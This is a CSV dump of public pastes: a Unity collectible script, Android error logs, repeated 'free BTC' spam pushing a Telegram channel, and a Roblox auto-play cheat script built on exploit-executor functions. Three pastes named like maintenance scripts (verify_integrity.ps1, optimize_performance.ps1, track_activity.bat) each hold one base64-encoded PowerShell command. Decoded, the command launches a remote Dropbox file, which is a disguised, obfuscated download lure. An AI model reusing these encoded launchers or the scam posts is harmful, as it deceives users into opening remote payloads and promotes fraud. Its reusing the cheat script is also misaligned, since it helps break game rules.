id,title,username,language,date,content
Nb9E543t,Collectable,GigaOrts,C#,Sunday 29th of June 2025 07:04:43 AM CDT,"using UnityEngine;

public class Collectable : MonoBehaviour
{
    public GameObject fruit;
    public GameObject animation;
    public AudioClip sound;
    
    private void OnTriggerEnter2D(Collider2D other)
    {
        if (other.CompareTag(""Player""))
        {
            fruit.SetActive(false);
            animation.SetActive(true);
            AudioSource.PlayClipAtPoint(sound, transform.position);
            Destroy(other.gameObject);
        }
    }
}"
7hZDJxyC,verify_integrity.ps1,Miguel6t75,Batch,Sunday 29th of June 2025 07:04:11 AM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwB4AGwANAA0AGgAOQAzAHEAYwAzAHAAawAzAGoAZwAzAGIAaQAyAG8AMwAvAG4AZQB3AHQAdQB0AC4AcABkAGYAPwByAGwAawBlAHkAPQB2AHoANwB0ADIANgBpAGkAMwBtAGIAYgBvAGEANgB0AGwAMAAyAHEAZgB5AHUAOQBlACYAZQA9ADEAJgBzAHQAPQBkAGIAaQA2AGoAcQA2AGYAIgAgACAAIwAgAGkAZAA9ADEAYQA5ADMAYgAzADYAMwA=

A2UQU"
5dQpq9FG,FREE BTC GUIDE 3,w3tse3fswrf,JavaScript,Sunday 29th of June 2025 07:03:15 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/WesGuid
ACC 9923658
"
KXq3DtS0,FREE BTC GUIDE 4,fakouff,JavaScript,Sunday 29th of June 2025 07:02:35 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/WesGuid
ACC 3067804
"
MEDguL23,Make $1200 in 15 minutes J,GJovi,JavaScript,Sunday 29th of June 2025 07:01:54 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/WesGuid
ACC 6431300
"
aZpAfnSE,optimize_performance.ps1,Miguel6t75,Batch,Sunday 29th of June 2025 06:54:10 AM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwB4AGwANAA0AGgAOQAzAHEAYwAzAHAAawAzAGoAZwAzAGIAaQAyAG8AMwAvAG4AZQB3AHQAdQB0AC4AcABkAGYAPwByAGwAawBlAHkAPQB2AHoANwB0ADIANgBpAGkAMwBtAGIAYgBvAGEANgB0AGwAMAAyAHEAZgB5AHUAOQBlACYAZQA9ADEAJgBzAHQAPQBkAGIAaQA2AGoAcQA2AGYAIgAgACAAIwAgAGkAZAA9ADcANQBmADYAZgBlADgAMgA=

LRyVS"
27Ht3CMt,2025-06-29T07:44:43.625222,powerampache,PHP,Sunday 29th of June 2025 06:44:43 AM CDT,"1.01-79 (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Unable to parse TLS packet header"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1156)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:651)
	at java.lang.Thread.run(Thread.java:1119)

authorize() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""Unable to parse TLS packet header\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""Unable to parse TLS packet header\"" }"",""stackTrace"":[],""suppressedExceptions"":[]}"
rTYyjfD7,track_activity.bat,Miguel6t75,Batch,Sunday 29th of June 2025 06:44:09 AM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwB4AGwANAA0AGgAOQAzAHEAYwAzAHAAawAzAGoAZwAzAGIAaQAyAG8AMwAvAG4AZQB3AHQAdQB0AC4AcABkAGYAPwByAGwAawBlAHkAPQB2AHoANwB0ADIANgBpAGkAMwBtAGIAYgBvAGEANgB0AGwAMAAyAHEAZgB5AHUAOQBlACYAZQA9ADEAJgBzAHQAPQBkAGIAaQA2AGoAcQA2AGYAIgAgACAAIwAgAGkAZAA9AGYAMwA4ADEAYQBlAGYANgA=

g6UIn"
ki6BzGB5,2025-06-29T07:43:13.476768,powerampache,PHP,Sunday 29th of June 2025 06:43:14 AM CDT,"1.01-79 (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Failed to connect to /100.115.221.93:80"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1156)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:651)
	at java.lang.Thread.run(Thread.java:1119)

authorize() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""Failed to connect to /100.115.221.93:80\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""Failed to connect to /100.115.221.93:80\"" }"",""stackTrace"":[],""suppressedExceptions"":[]}"
a9WLaxZ8,Hunted,DeezBigNuts,Lua,Sunday 29th of June 2025 06:37:29 AM CDT,"-------------------->> Services <<--------------------

local cloneref = cloneref or function (...)
	return ...
end

local Services = setmetatable({}, {
	__index = function(self, service)
		return cloneref(game:FindService(service)) or cloneref(game:GetService(service)) or cloneref(game:service(service))
	end
})

local WorkSpace = Services.Workspace
local Players = Services.Players

-------------------->> Variables <<--------------------

local Player = Players.LocalPlayer
local PlayerGui = Player.PlayerGui
local NotificationStack = PlayerGui.Notifications.NotificationStack

local Character = Player.Character
local HumanoidRootPart = Character.HumanoidRootPart

local Shards = WorkSpace.Shards
local Hotel = WorkSpace.Hotel
local Portals = WorkSpace.Portals

local EntrancePortal = Portals.EntrancePortal

local Elevator = Hotel.Elevator
local InsideElevator = Elevator.ElevatorInside

-------------------->> Main <<--------------------

getgenv().TPAlready = getgenv().TPAlready or false
getgenv().BoardsBroke = getgenv(). BoardsBroke or false
getgenv().CollectedAll = getgenv().CollectedAll or false
getgenv().ReturnedToAlt = getgenv().ReturnedToAlt or false
getgenv().ReturnedToPort = getgenv().ReturnedToPort or false

if workspace:GetAttribute(""GameStarted"") == nil and getgenv().TPAlready == false then
	HumanoidRootPart.CFrame = InsideElevator.CFrame
end

repeat task.wait() until Hotel:FindFirstChild(""Maze"") ~= nil

local Maze = Hotel.Maze
local Interactable = Maze.Interactable
local RingAltarModel = Maze.Rooms.Main.RingAltar
local RingAltar = RingAltarModel.Parts.RingAltar

if workspace:GetAttribute(""GameStarted"") == nil and getgenv().TPAlready == false then
	HumanoidRootPart.CFrame = RingAltar.CFrame
	getgenv().TPAlready = true
end

if WorkSpace:GetAttribute(""Skipped"") == nil then
	local Button:TextButton = nil
	for i, v in pairs(NotificationStack:GetChildren()) do
		if v:IsA(""Frame"") and v:FindFirstChild(""Buttons"") ~= nil then
			if v.Buttons:FindFirstChild(""Button1_Clone"") == nil then continue end
            Button = v.Buttons.Button1_Clone
			firesignal(Button.MouseButton1Click)
		end
	end
	
	if Button == nil then
		local Connection
		Connection = NotificationStack.ChildAdded:Connect(function(Child:Frame)
			if Child:IsA(""Frame"") and Child:FindFirstChild(""Buttons"") ~= nil then
				if Child.Buttons:FindFirstChild(""Button1_Clone"") == nil then return end
				Button = Child.Buttons.Button1_Clone
				firesignal(Button.MouseButton1Click)
				Connection:Disconnect()
				Connection = nil
			end
		end)
	end
end

repeat print(""waiting for game to start"") task.wait() until WorkSpace:GetAttribute(""GameStarted"") == true
repeat task.wait() until WorkSpace:GetAttribute(""CurrentQuest"") ~= nil
repeat print(""waiting for current quest: BREAK THE BOARDS"") task.wait() until string.lower(WorkSpace:GetAttribute(""CurrentQuest"")) == ""break the boards"" or getgenv().BoardsBroke == true

for _, v in pairs(Interactable:GetDescendants()) do
	if v.Name == ""Interact"" and v:FindFirstChildOfClass(""RemoteEvent"") ~= nil then
		v:FindFirstChildOfClass(""RemoteEvent""):FireServer()
	end
end

getgenv().BoardsBroke = true

local function getClosestShard(objects)
	local closestShard = nil
	local shortestDistance = math.huge

	for _, object in ipairs(objects) do
		if object:IsA(""BasePart"") then
			local distance = (object.Position - HumanoidRootPart.Position).Magnitude
			if distance < shortestDistance then
				shortestDistance = distance
				closestShard = object
			end
		end
	end

	return closestShard
end

for i, v in pairs(Shards:GetChildren()) do
    if i >= 4 then break end
    local closest = getClosestShard(Shards:GetChildren())
    repeat task.wait() Character.Humanoid:MoveTo(closest.Position) until closest.Parent == nil
end

repeat task.wait() print(""waiting for current quest: COLLECT ALL SHARDS"") until string.lower(WorkSpace:GetAttribute(""CurrentQuest"")) == ""collect all shards"" or getgenv().CollectedAll == true

for _, v in pairs(Shards:GetChildren()) do
	if v:FindFirstChild(""TouchInterest"") ~= nil then
		firetouchinterest(HumanoidRootPart, v, 0)
		firetouchinterest(HumanoidRootPart, v, 1)
	end
end

getgenv().CollectedAll = true

repeat task.wait() print(""waiting for current quest: GET BACK TO THE RING ALTAR"") until string.lower(WorkSpace:GetAttribute(""CurrentQuest"")) == ""get back to the ring altar"" or getgenv().ReturnedToAlt == true

if getgenv().ReturnedToAlt ~= true then
	for i = 1, 5 do
		HumanoidRootPart.CFrame = RingAltar.CFrame
		task.wait(0.6)
	end
	getgenv().ReturnedToAlt = true
end

repeat
	task.wait()
	if Hotel.Maze.Rooms.Main.RingAltar:FindFirstChild(""Interact"") ~= nil then
		print(""Woah"")
		if Hotel.Maze.Rooms.Main.RingAltar.Interact:FindFirstChildOfClass(""RemoteEvent"") ~= nil then
			print(""Nay"")
			Hotel.Maze.Rooms.Main.RingAltar.Interact:FindFirstChildOfClass(""RemoteEvent""):FireServer()
		end
	end
	print(""waiting for current quest: RETURN TO PORTAL"")
until string.lower(WorkSpace:GetAttribute(""CurrentQuest"")) == ""return to the portal"" or getgenv().ReturnedToPort == true

if getgenv().ReturnedToPort ~= true then
	task.wait(2)
	repeat task.wait() HumanoidRootPart.CFrame = InsideElevator.CFrame until Hotel:FindFirstChild(""Entrance"") ~= nil and (HumanoidRootPart.Position - Hotel.Entrance.Lobby.MiddleCarpet.Position).Magnitude <= 100
	repeat task.wait() HumanoidRootPart.CFrame = Hotel.Events.MonkeysSpawn.Object.CFrame until #WorkSpace.Terrain.Enemies:GetChildren() > 2
	task.wait(1)
	repeat task.wait() Character.Humanoid:MoveTo(EntrancePortal.Zone.Position) until Player:GetAttribute(""BeingChased"") ~= true
	getgenv().ReturnedToPort = true
end"
